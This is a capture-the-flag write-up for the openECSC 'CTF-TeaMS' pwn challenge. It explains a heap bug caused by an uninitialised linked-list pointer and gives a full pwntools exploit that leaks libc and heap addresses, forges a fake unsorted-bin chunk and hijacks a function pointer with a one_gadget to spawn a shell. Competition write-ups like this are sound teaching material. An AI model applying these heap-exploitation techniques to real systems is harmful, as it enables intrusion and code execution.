# openECSC - Round 4

## [pwn] CTF-TeaMS (18 solves)

Always dreamt of being a pro CTF player but you have too many skill issues??
No worries, we got you covered! Now you can feel the same thrill pro players
do, by using our brand new CTF Team Manager Simulator!
Create your dream team, and go get those flags!

`nc ctfteams.challs.open.ecsc2024.it 47004`

Author: Nalin Dhingra <@Lotus>

## Overview

The challenge presents a simple binary that works as a CTF simulator, in which
you can create a team of players (max 5) and solve challenges to get flags.
The team is managed through a linked list, and when adding a new player you
choose the name, motto and category of the player.
Then randomly the player is given a skill level and a mental health score is set
to 100. Each player is based on a structure with the following fields:

```c
#define MAX_NICK_LEN    500
#define MAX_MOTTO_LEN   0x200

enum category {
    CAT_PWN,
    CAT_RE,
    CAT_MISC,
    CAT_WEB,
    CAT_CRY,
};

struct __attribute__((__packed__)) ctfplayer {
    struct ctfplayer *next;
    enum category cat;
    char motto[MAX_MOTTO_LEN];
    char nick[MAX_NICK_LEN];
    void (*try_solve)(void *self);
    uint32_t flags;
    short mental_health;
    uint16_t skills;
};
```

As we can notice each player has a function pointer `try_solve` that is called
when it attempts to solve a challenge. The function pointer is set to a
different function depending on the category of the player.

Other functionalities include the removal of a single player (we can only do it
once), and the possibility to edit the motto of any player.

Moreover if we choose the category `CAT_PWN` the structure of the player
presents an extra field

```c
struct pwner {
    struct ctfplayer player;
    uint64_t zero_days;
};
```

### Vulnerability

The vulnerability presents in the functionality that adds a new player, in fact
when the `struct ctfplayer` is initialized the `next` field is not explicitly
set to `NULL`. This doesn't normally present a problem, because when `malloc()`
takes a chunk from the top chunk it is usually already zeroed out. However, the
binary also gives the possibility to remove a player from the team once, hence
freeing the memory related to the structure in question.

This chunk if placed carefully will not consolidate with the top chunk and will
be therefore inserted in the unsorted bin list, placing pointers to `main_arena`
in the `fd` and `bk` fields of the chunk. When reallocating the chunk, the field
corresponding to the `next` pointer in the `struct ctfplayer` will contain the
leftover pointer to `main_arena`, thus corrupting the linked list.

The fake player on the `main_arena` coincidentally has as the `next` field the
pointer to the `top_chunk`, therefore when corrupting the linked list we insert
two fake players in the list, one over `main_arena` and the other over the
`top_chunk`.

## Solution

The main idea to solve the challenge is to use the fake player over the
`main_arena` to get leaks of `libc`, get a leak of an heap address from the
`next` field of the fake player over the `top_chunk`, and then forge a fake
unsorted bin chunk that will overlap with its `nick` with the function pointer
of an existing player.
We can use the edit functionality to craft the fake unsorted bin both on the
heap and in `main_arena` being careful to satisfy all the checks run by
`malloc()` to ensure it is a valid unsorted bin chunk.

Once we obtain back the unsorted bin chunk, we can overwrite the `try_solve`
function pointer with a `one_gadget`, and then call the function to get a shell.

## Exploit

```python
#!/bin/env python3

from pwn import *

#
# INIT
#
elf = context.binary = ELF("./bin/ctf-teams", False)
libc = ELF("./glibc/libc.so.6", False)

#
# FUNCTIONS
#
def add_player(cat, nick, motto):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(cat).encode())
    io.sendlineafter(b"Nickname: ", nick)
    io.sendlineafter(b"Motto: ", motto)

def remove_player(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())

def show_player(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(idx).encode())

def solve_chall(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(idx).encode())

def edit_motto(idx, motto):
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendlineafter(b"motto: ", motto)

#
# EXPLOIT
#
def main():
    global io
    io = process(elf.path)
    if io == -1:
        return -1

    add_player(2, b"A"*8, b"MOTTO")
    add_player(2, b"A"*8, b"MOTTO")
    add_player(2, b"B"*8, b"MOTTO")
    remove_player(2)

    add_player(2, b"C"*8, b"MOTTO")

    # Leak libc
    show_player(4)
    io.recvuntil(b"obtained: ")
    libc_leak = int(io.recvline(False))
    io.recvuntil(b"health: [")
    libc_leak += (int(io.recvuntil(b"/", True)) << 32)
    libc.address = libc_leak - 0x21b0d0
    success(f"libc @ {hex(libc.address)}")

    # Leak heap
    add_player(1, b"D"*8, b"GIVEMEHEAPLEAK")
    show_player(6)
    io.recvuntil(b"exploits: ")
    heap_base = int(io.recvline(False)) - 0xf00
    success(f"heap base @ {hex(heap_base)}")

    # Craft fake unsorted bin
    unsorted_arena_ptr = libc.address + 0x21ace0
    payload = b"AAAA" + b"PWNINGINPROGRESS" * 16
    payload += p64(0) + p64(0x421)
    payload += p64(unsorted_arena_ptr) * 2
    edit_motto(1, payload)

    # Next fake size
    payload = b"BBBB" + b"PWNINGINPROGRESS" * 16
    payload += p64(0x420) + p64(0x300)
    edit_motto(3, payload)

    # Overwrite pointers in main arena.
    # We have to do multiple writes to avoid '\n' and overwriting of other
    # pointers
    payload = b"A" * 12
    payload += p64(heap_base + 0x3b0)
    payload = payload[:-2]
    edit_motto(4, payload)
    payload = b"A" * 4
    payload += p64(heap_base + 0x3b0)
    payload = payload[:-2]
    edit_motto(4, payload)
    payload = b"AA"
    edit_motto(4, payload)
    payload = b""
    edit_motto(4, payload)

    # Allocate fake chunk and overwrite function pointer with one gadget
    nick = b"P"*0xd4
    nick += (libc.address + 0xebc81).to_bytes(8, "little")
    nick += p32(0) + p32(0x004c0064)
    nick += p64(0)
    nick += p64(0x421)
    nick += p64(0)
    nick += p64(0x1)
    add_player(3, nick, b"FAKECHUNK")

    # Trigger one gadget
    solve_chall(1)


    io.interactive()


if __name__ == "__main__":
    main()
```
